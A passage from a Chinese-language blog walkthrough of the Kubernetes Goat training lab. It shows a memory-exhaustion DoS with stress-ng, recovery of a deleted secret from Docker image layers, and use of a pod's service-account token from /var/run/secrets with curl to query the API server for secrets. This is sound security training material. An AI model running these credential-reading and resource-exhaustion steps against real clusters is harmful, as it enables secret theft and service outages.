class="line">0::/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br></pre></td></tr></table></figure><p>可以通过在node执行ps看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps -a | grep 5702</span><br><span class="line">5702cc4cdd60   madhuakula/k8s-goat-system-monitor                    &quot;gotty -w bash&quot;          6 days ago     Up 6 days                           k8s_system-monitor_system-monitor-deployment-594c89b48f-97rs9_default_081f809d-8199-44bd-8f86-ac6942df3dc8_0</span><br></pre></td></tr></table></figure><p>其他的信息收集</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/cgroup</span><br><span class="line">cat /etc/hosts</span><br><span class="line"># 挂载信息</span><br><span class="line">mount</span><br><span class="line"># 查看文件系统</span><br><span class="line">ls -la /home/</span><br><span class="line">printenv或者直接env</span><br></pre></td></tr></table></figure><p>在环境变量中就有flag了</p><p><img src="http://pic.giantbranch.cn/pic/1655868160342.png" alt></p><h1 id="DOS内存或CPU等资源"><a href="#DOS内存或CPU等资源" class="headerlink" title="DOS内存或CPU等资源"></a>DOS内存或CPU等资源</h1><p>假如Kubernetes部署的yaml文件没有对资源的使用进行限制，那么攻击者可能就可以消耗pod/deployment的资源，从而对Kubernetes造成DOS</p><p>这里使用stress-ng压力测试程序来测试</p><p>先看看初始资源占用情况，cpu是0，内存是不超过10M</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker stats --no-stream | grep hunger</span><br><span class="line">842e3f0c146a   k8s_hunger-check_hunger-check-deployment-56d65977f6-k68g9_big-monolith_8bd7722d-bdf5-4230-9265-1447b8317e0d_0              0.00%     6.609MiB / 15.64GiB   0.04%     0B / 0B   0B / 0B          8</span><br><span class="line">302af9807534   k8s_POD_hunger-check-deployment-56d65977f6-k68g9_big-monolith_8bd7722d-bdf5-4230-9265-1447b8317e0d_0                       0.00%     1.227MiB / 15.64GiB   0.01%     0B / 0B   0B / 0B          1</span><br></pre></td></tr></table></figure><p>执行下面命令进行压力测试，–vm是启动8个worker去匿名mmap，–vm-bytes是每个worker分配的内存，但是我设置2G发现16内存没用满，只用了2-3G，所以索性改为16G，最后–timeout就是压力测试60s后停止</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stress-ng --vm 8 --vm-bytes 16G --timeout 60s</span><br></pre></td></tr></table></figure><p>下面是压力测试中在node执行htop的截图</p><p><img src="http://pic.giantbranch.cn/pic/1655884111674.png" alt></p><p>在node执行<code>docker stats  | grep hunger</code>，到后面直接就获取不了</p><p><img src="http://pic.giantbranch.cn/pic/1655884216613.png" alt></p><p>这样可能会使其他pod可能无法获得执行的资源，无法处理用户请求或者超级卡顿，假如是自己的服务器可能消耗更多的电费，假如是云服务则可能需要支付更加昂贵的账单。</p><p>我们查看一下部署的yaml文件，可以看到资源限制是被注释掉的，不过1000G跟没限制也差不多了</p><p><img src="http://pic.giantbranch.cn/pic/1655886492294.png" alt></p><h1 id="Hacker-container"><a href="#Hacker-container" class="headerlink" title="Hacker container"></a>Hacker container</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl run -it --rm hacker-container --image=madhuakula/hacker-container -- sh</span><br></pre></td></tr></table></figure><p>启动pod后我们可以用amicontained评估容器的权限等信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">~ # amicontained</span><br><span class="line">Container Runtime: docker</span><br><span class="line">Has Namespaces:</span><br><span class="line">pid: true</span><br><span class="line">user: false</span><br><span class="line">AppArmor Profile: docker-default (enforce)</span><br><span class="line">Capabilities:</span><br><span class="line">BOUNDING -&gt; chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap</span><br><span class="line">Seccomp: disabled</span><br><span class="line">Blocked Syscalls (22):</span><br><span class="line">MSGRCV SYSLOG SETSID VHANGUP PIVOT_ROOT ACCT SETTIMEOFDAY UMOUNT2 SWAPON SWAPOFF REBOOT SETHOSTNAME SETDOMAINNAME INIT_MODULE DELETE_MODULE LOOKUP_DCOOKIE KEXEC_LOAD PERF_EVENT_OPEN FANOTIFY_INIT OPEN_BY_HANDLE_AT FINIT_MODULE KEXEC_FILE_LOAD</span><br><span class="line">Looking for Docker.sock</span><br></pre></td></tr></table></figure><p>还可以用里面的nikto进行web漏洞扫描，看着效果不怎么样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">~ # nikto.pl -host http://metadata-db</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          10.105.74.206</span><br><span class="line">+ Target Hostname:    metadata-db</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2022-06-22 08:20:04 (GMT0)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: No banner retrieved</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ No CGI Directories found (use &apos;-C all&apos; to force check all possible dirs)</span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span><br><span class="line">+ 7373 requests: 0 error(s) and 4 item(s) reported on remote host</span><br><span class="line">+ End Time:           2022-06-22 08:21:53 (GMT0) (109 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure><h1 id="隐藏在镜像层中的信息"><a href="#隐藏在镜像层中的信息" class="headerlink" title="隐藏在镜像层中的信息"></a>隐藏在镜像层中的信息</h1><p>在docker镜像中，很容易可能将密码、私钥、令牌等放入到了镜像中</p><p>作者设计了一个hidden-in-layers的jobs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl get jobs</span><br><span class="line">NAME               COMPLETIONS   DURATION   AGE</span><br><span class="line">batch-check-job    1/1           36s        6d5h</span><br><span class="line">hidden-in-layers   0/1           6d5h       6d5h</span><br><span class="line">kube-bench-node    1/1           29s        46h</span><br></pre></td></tr></table></figure><p>查看部署文件，确认镜像名称</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat ~/kubernetes-goat/scenarios/hidden-in-layers/deployment.yaml | grep image</span><br><span class="line">        image: madhuakula/k8s-goat-hidden-in-layers</span><br></pre></td></tr></table></figure><p>到node查看镜像的信息，通过<code>docker inspect</code>可以看到最终执行的cmd命令，但是这样只能看到一个命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$  madhuakula/k8s-goat-hidden-in-layers | grep &quot;Cmd&quot; -A 5</span><br><span class="line">            &quot;Cmd&quot;: null,</span><br><span class="line">            &quot;Image&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Volumes&quot;: null,</span><br><span class="line">            &quot;WorkingDir&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Entrypoint&quot;: null,</span><br><span class="line">            &quot;OnBuild&quot;: null,</span><br><span class="line">--</span><br><span class="line">            &quot;Cmd&quot;: [</span><br><span class="line">                &quot;sh&quot;,</span><br><span class="line">                &quot;-c&quot;,</span><br><span class="line">                &quot;tail -f /dev/null&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;ArgsEscaped&quot;: true,</span><br></pre></td></tr></table></figure><p>之前已经用过<code>docker history</code>来看每一层所执行的命令了，这里我们可以看到一个/root/secret.txt的文件，但是在后面删掉了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ docker history --no-trunc madhuakula/k8s-goat-hidden-in-layers</span><br><span class="line">IMAGE                                                                     CREATED        CREATED BY                                                                                                              SIZE      COMMENT</span><br><span class="line">sha256:8944f45111dbbaa72ab62c924b0ae86f05a2e6d5dcf8ae2cc75561773bd68607   5 weeks ago    CMD [&quot;sh&quot; &quot;-c&quot; &quot;tail -f /dev/null&quot;]                                                                                     0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;                                                                 5 weeks ago    RUN /bin/sh -c echo &quot;Contributed by Rewanth Cool&quot; &gt;&gt; /root/contribution.txt     &amp;&amp; rm -rf /root/secret.txt # buildkit   28B       buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;                                                                 5 weeks ago    ADD secret.txt /root/secret.txt # buildkit                                                                              41B       buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;                                                                 5 weeks ago    LABEL MAINTAINER=Madhu Akula INFO=Kubernetes Goat                                                                       0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;                                                                 2 months ago   /bin/sh -c #(nop)  CMD [&quot;/bin/sh&quot;]                                                                                      0B        </span><br><span class="line">&lt;missing&gt;                                                                 2 months ago   /bin/sh -c #(nop) ADD file:5d673d25da3a14ce1f6cf66e4c7fd4f4b85a3759a9d93efb3fd9ff852b5b56e4 in /                        5.57MB</span><br></pre></td></tr></table></figure><p>还有一个工具是<code>https://hub.docker.com/r/alpine/dfimage</code>，这个更全面，基于<code>https://github.com/P3GLEG/Whaler</code>进行构建的，可以搜索secret files(通过将image保存到文件，之后解压搜索里面的文件)，打印环境变量（docker inspect获取），具体实现可以查看<code>https://github.com/P3GLEG/Whaler/blob/master/main.go</code>和<code>https://github.com/P3GLEG/Whaler/blob/master/scanner.go</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ alias dfimage=&quot;docker run -v /var/run/docker.sock:/var/run/docker.sock --rm alpine/dfimage&quot;</span><br><span class="line">$ dfimage  madhuakula/k8s-goat-hidden-in-layers:latest</span><br><span class="line">Analyzing madhuakula/k8s-goat-hidden-in-layers:latest</span><br><span class="line">Docker Version: </span><br><span class="line">GraphDriver: overlay2</span><br><span class="line">Environment Variables</span><br><span class="line">|PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"></span><br><span class="line">Image user</span><br><span class="line">|User is root</span><br><span class="line"></span><br><span class="line">Potential secrets:</span><br><span class="line">|Found match etc/apk/keys/alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub Possible public key \.pub$ 79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar</span><br><span class="line">|Found match etc/apk/keys/alpine-devel@lists.alpinelinux.org-5243ef4b.rsa.pub Possible public key \.pub$ 79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar</span><br><span class="line">|Found match etc/apk/keys/alpine-devel@lists.alpinelinux.org-5261cecb.rsa.pub Possible public key \.pub$ 79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar</span><br><span class="line">|Found match etc/apk/keys/alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub Possible public key \.pub$ 79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar</span><br><span class="line">|Found match etc/apk/keys/alpine-devel@lists.alpinelinux.org-61666e3f.rsa.pub Possible public key \.pub$ 79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar</span><br><span class="line">|Found match etc/udhcpd.conf DHCP server configs dhcpd[^ ]*.conf 79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar</span><br><span class="line">Dockerfile:</span><br><span class="line">CMD [&quot;/bin/sh&quot;]</span><br><span class="line">LABEL MAINTAINER=Madhu Akula INFO=Kubernetes Goat</span><br><span class="line">ADD secret.txt /root/secret.txt # buildkit</span><br><span class="line">root/</span><br><span class="line">root/secret.txt</span><br><span class="line"></span><br><span class="line">RUN RUN echo &quot;Contributed by Rewanth Cool&quot; &gt;&gt; /root/contribution.txt  \</span><br><span class="line">&amp;&amp; rm -rf /root/secret.txt # buildkit</span><br><span class="line">CMD [&quot;sh&quot; &quot;-c&quot; &quot;tail -f /dev/null&quot;]</span><br></pre></td></tr></table></figure><p>可以看到ADD secret.txt /root/secret.txt之后的几行有点异常，不过影响不大</p><p>搜索dfimage的时候，还有一个github上也叫dfimage的可以将镜像还原成一个Dockerfile，是基于docker history，不用我们自己手动还原</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/LanikSJ/dfimage/blob/3d55b88596d5eec8d4beff171ad5d4931043ad19/entrypoint.py#L17</span><br></pre></td></tr></table></figure><p><img src="http://pic.giantbranch.cn/pic/1655973767156.png" alt></p><p>执行结果FROM这个输出肯定是不对的了，第二行也看不出什么</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -v /var/run/docker.sock:/var/run/docker.sock dfimage madhuakula/k8s-goat-hidden-in-layers:latest</span><br><span class="line">FROM madhuakula/k8s-goat-hidden-in-layers:latest</span><br><span class="line">ADD file:90e56af13188c7f0283d244a0d70b853d8bef8587a41f1da8eac3a2aba8964ef in /</span><br><span class="line">CMD [&quot;/bin/sh&quot;]</span><br><span class="line">RUN LABEL MAINTAINER=Madhu Akula INFO=Kubernetes Goat</span><br><span class="line">RUN ADD secret.txt /root/secret.txt # buildkit</span><br><span class="line">RUN RUN /bin/sh -c echo &quot;Contributed by Rewanth Cool&quot; &gt;&gt; /root/contribution.txt     \</span><br><span class="line">    &amp;&amp; rm -rf /root/secret.txt # buildkit</span><br><span class="line">RUN CMD [&quot;sh&quot; &quot;-c&quot; &quot;tail -f /dev/null&quot;]</span><br></pre></td></tr></table></figure><p>但是这只是让我们看到有这个文件，我们需要看看这个文件，直接启动容器肯定没有，因为已经删掉了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl run test --rm --restart=Never -it --image=madhuakula/k8s-goat-hidden-in-layers -- sh</span><br><span class="line">If you don&apos;t see a command prompt, try pressing enter.</span><br><span class="line">/ # ls</span><br><span class="line">bin    dev    etc    home   lib    media  mnt    opt    proc   root   run    sbin   srv    sys    tmp    usr    var</span><br><span class="line">/ # cd root/</span><br><span class="line">~ # ls -la</span><br><span class="line">total 16</span><br><span class="line">drwx------    1 root     root          4096 Jun 24 08:33 .</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Jun 24 08:29 ..</span><br><span class="line">-rw-------    1 root     root            19 Jun 24 08:34 .ash_history</span><br><span class="line">-rw-r--r--    1 root     root            28 May 16 20:41 contribution.txt</span><br><span class="line">~ #</span><br></pre></td></tr></table></figure><p>但是在删掉的那一层的上一层还有，我们可以先将整个image保存到文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># root @ nsfocus  in ~ [16:35:15]</span><br><span class="line">$ mkdir hidden-in-layers</span><br><span class="line"># root @ nsfocus  in ~ [16:35:24]</span><br><span class="line">$ docker save madhuakula/k8s-goat-hidden-in-layers -o hidden-in-layers/hidden-in-layers.tar</span><br><span class="line"># root @ nsfocus  in ~ [16:35:48]</span><br><span class="line">$ cd hidden-in-layers/</span><br><span class="line"># root @ nsfocus  in ~/hidden-in-layers [16:35:52]</span><br><span class="line">$ tar -xvf hidden-in-layers.tar</span><br><span class="line">66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/</span><br><span class="line">66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/VERSION</span><br><span class="line">66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/json</span><br><span class="line">66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/layer.tar</span><br><span class="line">79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/</span><br><span class="line">79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/VERSION</span><br><span class="line">79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/json</span><br><span class="line">79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar</span><br><span class="line">8944f45111dbbaa72ab62c924b0ae86f05a2e6d5dcf8ae2cc75561773bd68607.json</span><br><span class="line">c8e3854bdc614a630d638b7cb682ed66c824e25b5c7a37cf14c63db658b99723/</span><br><span class="line">c8e3854bdc614a630d638b7cb682ed66c824e25b5c7a37cf14c63db658b99723/VERSION</span><br><span class="line">c8e3854bdc614a630d638b7cb682ed66c824e25b5c7a37cf14c63db658b99723/json</span><br><span class="line">c8e3854bdc614a630d638b7cb682ed66c824e25b5c7a37cf14c63db658b99723/layer.tar</span><br><span class="line">manifest.json</span><br><span class="line">repositories</span><br></pre></td></tr></table></figure><p>这里面有3层是有layer.tar文件的，少的时候我们当然可以全部一个一个解压，去找secret.txt</p><p>但是有个工具可以快速确认是哪个id的layer.tar，就是dive</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/wagoodman/dive/releases/download/v0.10.0/dive_0.10.0_linux_amd64.deb</span><br><span class="line">apt install ./dive_0.10.0_linux_amd64.deb</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dive madhuakula/k8s-goat-hidden-in-layers</span><br></pre></td></tr></table></figure><p>通过下图，我们就知道在<code>66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535</code>那里</p><p><img src="http://pic.giantbranch.cn/pic/1656059966822.png" alt></p><p>最终获取到<code>secret.txt</code>文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># root @ nsfocus  in ~/hidden-in-layers [16:39:52]</span><br><span class="line">$ cd 66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/</span><br><span class="line"># root @ nsfocus  in ~/hidden-in-layers/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535 [16:39:54]</span><br><span class="line">$ ls</span><br><span class="line">json  layer.tar  VERSION</span><br><span class="line"># root @ nsfocus  in ~/hidden-in-layers/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535 [16:39:55]</span><br><span class="line">$ tar -xf ./layer.tar </span><br><span class="line"># root @ nsfocus  in ~/hidden-in-layers/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535 [16:40:05]</span><br><span class="line">$ ls</span><br><span class="line">json  layer.tar  root  VERSION</span><br><span class="line"># root @ nsfocus  in ~/hidden-in-layers/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535 [16:40:07]</span><br><span class="line">$ cd root/</span><br><span class="line"># root @ nsfocus  in ~/hidden-in-layers/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/root [16:40:10]</span><br><span class="line">$ ls</span><br><span class="line">secret.txt</span><br><span class="line"># root @ nsfocus  in ~/hidden-in-layers/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/root [16:40:12]</span><br><span class="line">$ cat secret.txt </span><br><span class="line">k8s-goat-3b7a7dc7f51f4014ddf3446c25f8b772</span><br></pre></td></tr></table></figure><h1 id="RBAC-最低权限配置错误"><a href="#RBAC-最低权限配置错误" class="headerlink" title="RBAC 最低权限配置错误"></a>RBAC 最低权限配置错误</h1><p>在 Kubernetes 早期，没有 RBAC（role-based access control，基于角色的访问控制）这样的概念，主要使用 ABAC（attribute-based access control，基于属性的访问控制）。现在它拥有像 RBAC 这样的超能力来实现最小权限的安全原则。尽管如此，有时权限还是给多了。</p><p>目标挑战是查找k8svaultapikey </p><p>默认情况下，Kubernetes 将所有令牌和服务帐户信息存储在<code>/var/run/secrets/kubernetes.io/serviceaccount/</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@hunger-check-deployment-56d65977f6-k68g9:/# cd /var/run/secrets/kubernetes.io/serviceaccount/</span><br><span class="line">root@hunger-check-deployment-56d65977f6-k68g9:/var/run/secrets/kubernetes.io/serviceaccount# ls -la</span><br><span class="line">total 4</span><br><span class="line">drwxrwxrwt 3 root root  140 Jun 24 08:50 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Jun 16 02:55 ..</span><br><span class="line">drwxr-xr-x 2 root root  100 Jun 24 08:50 ..2022_06_24_08_50_43.045810252</span><br><span class="line">lrwxrwxrwx 1 root root   31 Jun 24 08:50 ..data -&gt; ..2022_06_24_08_50_43.045810252</span><br><span class="line">lrwxrwxrwx 1 root root   13 Jun 16 02:53 ca.crt -&gt; ..data/ca.crt</span><br><span class="line">lrwxrwxrwx 1 root root   16 Jun 16 02:53 namespace -&gt; ..data/namespace</span><br><span class="line">lrwxrwxrwx 1 root root   12 Jun 16 02:53 token -&gt; ..data/token</span><br></pre></td></tr></table></figure><p>一些目录和地址在环境变量都有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@hunger-check-deployment-56d65977f6-k68g9:/var/run/secrets/kubernetes.io/serviceaccount# env | grep SERVICEACCOUNT</span><br><span class="line">SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount</span><br><span class="line">root@hunger-check-deployment-56d65977f6-k68g9:/var/run/secrets/kubernetes.io/serviceaccount# env | grep KUBERNETES_SERVICE_HOST</span><br><span class="line">KUBERNETES_SERVICE_HOST=10.96.0.1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">export APISERVER=https://$&#123;KUBERNETES_SERVICE_HOST&#125;</span><br><span class="line">export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount</span><br><span class="line"># 命令空间路径</span><br><span class="line">export NAMESPACE=$(cat $&#123;SERVICEACCOUNT&#125;/namespace)</span><br><span class="line">export TOKEN=$(cat $&#123;SERVICEACCOUNT&#125;/token)</span><br><span class="line">export CACERT=$&#123;SERVICEACCOUNT&#125;/ca.crt</span><br></pre></td></tr></table></figure><p>这时我们就可以访问api服务器了，也看得服务器的真实ip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ curl --cacert $&#123;CACERT&#125; --header &quot;Authorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api</span><br><span class="line">&#123;</span><br><span class="line">  &quot;kind&quot;: &quot;APIVersions&quot;,</span><br><span class="line">  &quot;versions&quot;: [</span><br><span class="line">    &quot;v1&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;serverAddressByClientCIDRs&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;clientCIDR&quot;: &quot;0.0.0.0/0&quot;,</span><br><span class="line">      &quot;serverAddress&quot;: &quot;192.168.2.174:6443&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查询default命名空间的secrets，可以看到没权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ curl --cacert $&#123;CACERT&#125; --header &quot;Athorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api/v1/secrets</span><br><span class="line">&#123;</span><br><span class="line">  &quot;kind&quot;: &quot;Status&quot;,</span><br><span class="line">  &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">  &quot;metadata&quot;: &#123;</span><br><span class="line">    </span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;status&quot;: &quot;Failure&quot;,</span><br><span class="line">  &quot;message&quot;: &quot;secrets is forbidden: User \&quot;system:serviceaccount:big-monolith:big-monolith-sa\&quot; cannot list resource \&quot;secrets\&quot; in API group \&quot;\&quot; at the cluster scope&quot;,</span><br><span class="line">  &quot;reason&quot;: &quot;Forbidden&quot;,</span><br><span class="line">  &quot;details&quot;: &#123;</span><br><span class="line">    &quot;kind&quot;: &quot;secrets&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;code&quot;: 403</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看当前命名空间中的secrets</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --cacert $&#123;CACERT&#125; --header &quot;Authorization: Bearer $&#123;TOKEN&#125;&quot; -X GET 